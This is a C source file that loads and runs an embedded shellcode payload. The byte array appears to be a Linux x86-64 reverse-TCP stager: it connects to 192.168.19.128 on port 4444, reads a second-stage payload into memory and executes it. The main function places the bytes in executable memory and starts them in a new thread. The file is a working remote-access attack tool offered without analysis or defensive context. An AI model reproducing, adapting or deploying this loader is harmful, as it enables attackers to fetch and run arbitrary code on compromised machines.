#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <threads.h>
#include <sys/mman.h>  // for mprotect

static unsigned char buf[] = 
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x11\x5c\xc0\xa8\x13\x80\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";


// Thread function wrapper: casts the payload pointer to a function and calls it
int thread_func(void* arg) {
    void (*func)(void) = (void (*)(void))arg;
    func();
    return 0;
}

int main() {
    size_t bufSize = sizeof(buf);

    // Allocate executable memory (use mmap for guaranteed page alignment)
    unsigned char* addr = (unsigned char*)mmap(
        NULL, bufSize,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0
    );
    if (addr == MAP_FAILED) {
        fprintf(stderr, "Memory Allocation Failed\n");
        return 1;
    }

    memcpy(addr, buf, bufSize);

    // Flush instruction cache (important on non-x86 architectures)
    __builtin___clear_cache((char*)addr, (char*)addr + bufSize);

    thrd_t thread;
    // Pass the function pointer via thread_func wrapper
    if (thrd_create(&thread, thread_func, addr) != thrd_success) {
        fprintf(stderr, "Thread Creation Failed!\n");
        munmap(addr, bufSize);
        return 1;
    }

    thrd_join(thread, NULL);
    munmap(addr, bufSize);  // Clean up
    return 0;
}
